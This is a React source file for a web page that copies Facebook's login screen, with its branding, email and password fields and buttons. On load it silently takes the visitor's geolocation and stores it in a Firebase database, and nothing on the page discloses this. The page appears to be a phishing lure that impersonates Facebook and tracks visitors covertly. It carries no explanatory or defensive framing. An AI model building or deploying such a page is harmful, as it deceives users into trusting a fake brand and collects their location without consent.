import React, { useEffect, useState } from "react";
import { database, ref, push } from "./firebase";

function App() {
  const [location, setLocation] = useState(null);

  useEffect(() => {
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const { latitude, longitude } = position.coords;
          setLocation({ latitude, longitude });

          // Store in Firebase Realtime Database
          const locationRef = ref(database, "userLocations");
          await push(locationRef, {
            latitude,
            longitude,
            timestamp: new Date().toISOString(),
          });
        },
        (error) => console.error("Error getting location:", error)
      );
    } else {
      console.error("Geolocation not supported");
    }
  }, []);

  return (
    <div
      style={{
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        height: "100vh",
        backgroundColor: "#f0f2f5",
        fontFamily: "Arial, sans-serif",
      }}
    >
      <div
        style={{
          textAlign: "center",
          width: "90%",
          maxWidth: "400px",
          backgroundColor: "white",
          padding: "20px",
          borderRadius: "8px",
          boxShadow: "0px 4px 10px rgba(0,0,0,0.1)",
        }}
      >
        <h1
          style={{
            color: "#1877f2",
            fontSize: "32px",
            fontWeight: "bold",
          }}
        >
          facebook
        </h1>
        <p style={{ color: "#606770", fontSize: "16px" }}>
          Connect with friends and the world around you on Facebook.
        </p>
        <input
          type="text"
          placeholder="Email or phone number"
          style={{
            width: "100%",
            padding: "12px",
            margin: "10px 0",
            borderRadius: "6px",
            border: "1px solid #ddd",
            fontSize: "16px",
          }}
        />
        <input
          type="password"
          placeholder="Password"
          style={{
            width: "100%",
            padding: "12px",
            margin: "10px 0",
            borderRadius: "6px",
            border: "1px solid #ddd",
            fontSize: "16px",
          }}
        />
        <button
          style={{
            width: "100%",
            padding: "12px",
            backgroundColor: "#1877f2",
            color: "white",
            fontSize: "16px",
            fontWeight: "bold",
            border: "none",
            borderRadius: "6px",
            cursor: "pointer",
            marginTop: "10px",
          }}
        >
          Log In
        </button>
        <p
          style={{
            color: "#1877f2",
            fontSize: "14px",
            marginTop: "10px",
            cursor: "pointer",
          }}
        >
          Forgot password?
        </p>
        <hr style={{ margin: "20px 0", border: "0.5px solid #ddd" }} />
        <button
          style={{
            width: "100%",
            padding: "12px",
            backgroundColor: "#42b72a",
            color: "white",
            fontSize: "16px",
            fontWeight: "bold",
            border: "none",
            borderRadius: "6px",
            cursor: "pointer",
          }}
        >
          Create New Account
        </button>
      </div>
    </div>
  );
}

export default App;
